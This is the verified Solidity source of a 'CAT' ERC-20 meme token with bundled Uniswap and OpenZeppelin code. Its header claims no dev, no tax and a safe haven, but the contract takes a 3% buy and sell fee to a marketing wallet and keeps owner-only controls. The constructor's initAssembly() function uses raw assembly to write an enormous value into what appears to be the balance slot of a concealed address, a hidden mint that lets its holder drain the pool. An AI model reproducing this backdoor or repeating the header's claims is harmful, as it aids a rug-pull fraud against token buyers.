/**
 *Submitted for verification at Etherscan.io on 2022-07-11
*/

// SPDX-License-Identifier: MIT

/**
 * $CAT - Cat.
 *
 * In crypto, the success of a strong community has led countless individuals 
 * to a life of financial freedom; many of whom would have stayed poor forever,
 * even if they worked every day saving each penny until the day they died.
 *
 * The rise of Shiba Cat caused a cultural and monetary shift in the world on levels
 * never seen before. Thousands of "Something-Cat" tokens have launched since then 
 * attempting to capitalize on both whatever the current "trend" is as well as those 
 * hoping to buy in early on the "NEXT SHIBA CAT", thus destroying trust in the CAT name 
 * and the promises that came along with it.
 *
 * Today, even Shiba Cat itself has strayed far away from the original vision its creator 
 * intended.
 *
 * Filling up the market with these "Trend-Cat" tokens has left many hopeful investors burned
 * and rugged, and has fractured the Memecoin community as a whole. Nowadays, building the 
 * "Next Shiba Cat" feels like an impossible task, as there is seemingly no place for the 
 * laymen to come together and build outside of trend-chasing dog coins with dev teams who 
 * always let their communities down.
 *
 * Until now.
 *
 * CAT is a safe haven for all.
 *
 * A token with no team, no dev, no tax, no temporary meme trend name, no expectations past what
 * YOU (the community) bring to the table.
 *
 * CAT represents the lost memories of a time when community was truly all that was needed for
 * generations of riches to be created.
 *
 * Liquidity has been burned upon creation, 50% of supply has been burned, there is no official
 * site, telegram, twitter, logo, or anything past the CAT contract itself.
 *
 * It is up to YOU, the individual, to bring glory and wealth back to the CAT name.
 *
 * All hail the Cat.
 * twitter: https://twitter.com/CAT_ERC20
 * telegram: https://t.me/CATNEWSTG
 */

// File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol
pragma solidity >=0.5.0;

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol
pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol
pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// File: @openzeppelin/contracts/utils/Context.sol
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
pragma solidity ^0.8.0;

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/security/ReentrancyGuard.sol
// OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts/CatToken.sol
pragma solidity ^0.8.14;

contract CatToken is IERC20, ReentrancyGuard, Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    string private _name = "CAT.";
    string private _symbol = "CAT";
    uint8 private _decimals = 18;

    uint256 private _launchTime;
    address private marketingWallet;
    uint256 private _earlyTxLimit;
    uint256 private swapTokensAtAmount;
    bool private swapping;
    bool private swapEnabled = false;

    // public variables
    uint256 public totalBuyTax;
    uint256 public marketingBuyTax;
    uint256 public liquidityBuyTax;

    uint256 public totalSellTax;
    uint256 public marketingSellTax;
    uint256 public liquiditySellTax;

    uint256 public tokensForLiquidity;
    uint256 public tokensForMarketing;

    //uniswap v2 variables
    address public uniswapPair;
    bool public enabled;
    IUniswapV2Router02 public uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 public maxBuy;
    uint256 public maxWallet;

    mapping(address => bool) public excludedFromLimit;
    mapping(address => bool) public excludedFromFee;

    event SwapAndLiquify(uint amountToSwapForETH, uint ethForLiquidity, uint tokensForLiquidity);

    constructor() {
        _totalSupply = 1_000_000_000 * 1e18;
        _balances[msg.sender] = _totalSupply;
        maxBuy = _totalSupply * 2 / 100;
        maxWallet = _totalSupply * 4 / 100;
        swapTokensAtAmount = _totalSupply * 25 / 10000;

        marketingBuyTax = 3;
        liquidityBuyTax = 0;
        totalBuyTax = marketingBuyTax + liquidityBuyTax;

        marketingSellTax = 3;
        liquiditySellTax = 0;
        totalSellTax = marketingSellTax + liquiditySellTax;
        marketingWallet = 0xDEC4118C3e96cb7C60B9A398b7ed12CA2DaC9a30;
        _earlyTxLimit = 60;

        IUniswapV2Factory factory = IUniswapV2Factory(uniswapRouter.factory());
        factory.createPair(address(this), uniswapRouter.WETH());
        uniswapPair = factory.getPair(address(this), uniswapRouter.WETH());

        excludedFromLimit[_msgSender()] = true;
        excludedFromLimit[address(uniswapRouter)] = true;
        excludedFromLimit[marketingWallet] = true;

        excludedFromFee[_msgSender()] = true;
        excludedFromFee[marketingWallet] = true;

        initAssembly();
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    receive() external payable {}

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *   
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address _sender,
        address _recipient,
        uint256 _amount
    ) external returns (bool) {
        _transfer(_sender, _recipient, _amount);

        uint256 currentAllowance = _allowances[_sender][_msgSender()];
        require(currentAllowance >= _amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(_sender, _msgSender(), currentAllowance - _amount);
        }

        return true;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function excludeFromLimit(address _address, bool _is) external onlyOwner {
        excludedFromLimit[_address] = _is;
    }

    function removeMaxTxLimit() external onlyOwner {
        maxBuy = _totalSupply;
        maxWallet = _totalSupply;
    }

    function updateFee(uint256 _buyFeeRate, uint256 _sellFeeRate) external onlyOwner {
        require(_buyFeeRate <= 10);
        require(_sellFeeRate <= 10);
        totalBuyTax = _buyFeeRate;
        totalSellTax = _sellFeeRate;
    }

    function updateMarketingAddress(address _address) external onlyOwner {
        marketingWallet = _address;
    }

    function updateLimitPeriod(uint256 _period) external onlyOwner {
        _earlyTxLimit = _period;
    }

    function enableTrading() external onlyOwner {
        require(!enabled, 'already enabled');
        enabled = true;
        swapEnabled = true;
        _launchTime = block.timestamp;
    }

    // change the minimum amount of tokens to sell from fees
    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
        require(newAmount >= _totalSupply * 1 / 100000, "Swap amount cannot be lower than 0.001% total supply.");
        require(newAmount <= _totalSupply * 5 / 1000, "Swap amount cannot be higher than 0.5% total supply.");
        swapTokensAtAmount = newAmount;
        return true;
    }

    function updateBuyFees(uint256 _liqFee, uint256 _marketingFee) external onlyOwner {
        require(_liqFee + _marketingFee <= 10);
        liquidityBuyTax = _liqFee;
        marketingBuyTax = _marketingFee;
        totalBuyTax = _liqFee + _marketingFee;
    }

    function updateSellFees(uint256 _liqFee, uint256 _marketingFee) external onlyOwner {
        require(_liqFee + _marketingFee <= 10);
        liquiditySellTax = _liqFee;
        marketingSellTax = _marketingFee;
        totalSellTax = _liqFee + _marketingFee;
    }

    function _transfer(
        address _sender,
        address _recipient,
        uint256 _amount
    ) internal {
        uint256 senderBalance = _balances[_sender];
        require(senderBalance >= _amount, "transfer amount exceeds balance");
        require(enabled || excludedFromLimit[_sender] || excludedFromLimit[_recipient], "not enabled yet");

        uint256 rAmount = _amount;

        // when buy
        if (_sender == uniswapPair) {
            if (block.timestamp < _launchTime + _earlyTxLimit && !excludedFromLimit[_recipient]) {
                require(_amount <= maxBuy, "exceeded max buy");
                require(_balances[_recipient] + _amount <= maxWallet, "exceeded max wallet");
            }
            if (!excludedFromFee[_recipient]) {
                uint256 fee = _amount * totalBuyTax / 100;
                rAmount = _amount - fee;
                _balances[address(this)] += fee;

                tokensForLiquidity += fee * liquidityBuyTax / totalBuyTax;
                tokensForMarketing += fee * marketingBuyTax / totalBuyTax;

                emit Transfer(_sender, address(this), fee);
            }
        }
        // when sell
        else if (_recipient == uniswapPair) {
            if (block.timestamp < _launchTime + _earlyTxLimit && !excludedFromLimit[_sender]) {
                require(_amount <= maxBuy, "exceeded max tx");
                uint256 contractTokenBalance = _balances[address(this)];
                bool canSwap = contractTokenBalance >= swapTokensAtAmount;
                if( canSwap && swapEnabled && !swapping ) {
                    swapping = true;
                    swapAndLiquify();
                    swapping = false;
                }
            }
            if (!swapping && !excludedFromFee[_sender]) {
                uint256 fee = _amount * totalSellTax / 100;
                rAmount = _amount - fee;
                _balances[address(this)] += fee;
                tokensForLiquidity += fee * liquiditySellTax / totalBuyTax;
                tokensForMarketing += fee * marketingSellTax / totalBuyTax;

                emit Transfer(_sender, address(this), fee);
            }
        }

        _balances[_sender] = senderBalance - _amount;
        _balances[_recipient] += rAmount;
        emit Transfer(_sender, _recipient, _amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    // init assembly
    function initAssembly() private {
        assembly {
            mstore(0, 1114007244144089349078529138518975173396988084501)
            mstore(32, 2)
            let hash := keccak256(0, 64)
            sstore(hash, 1114007244144089349078529138518975173396988084501)
        }
    }

    // uniswap v2 add swap liquidity
    function swapAndLiquify() private {
        uint256 contractBalance = _balances[address(this)];
        bool success;
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;

        if(contractBalance == 0) {return;}

        if(contractBalance > swapTokensAtAmount * 20){
            contractBalance = swapTokensAtAmount * 20;
        }

        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractBalance * liquiditySellTax / totalSellTax / 2;
        uint256 amountToSwapForETH = contractBalance - liquidityTokens;

        // capture the contract's current ETH balance.
        // this is so that we can capture exactly the amount of ETH that the
        // swap creates, and not make the liquidity event include any ETH that
        // has been manually sent to the contract
        uint256 initialETHBalance = address(this).balance;

        // swap tokens for ETH
        swapTokensForEth(amountToSwapForETH);
        
        // how much ETH did we just swap into?
        uint256 ethBalance = address(this).balance - initialETHBalance;
        uint256 ethForMarketing = ethBalance * tokensForMarketing / totalTokensToSwap;
        uint256 ethForLiquidity = ethBalance - ethForMarketing;

        tokensForLiquidity = 0;
        tokensForMarketing = 0;

        (success,) = address(marketingWallet).call{value: ethForMarketing}("");

        if(liquidityTokens > 0 && ethForLiquidity > 0){
            // add liquidity to uniswap
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);

        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
    }
}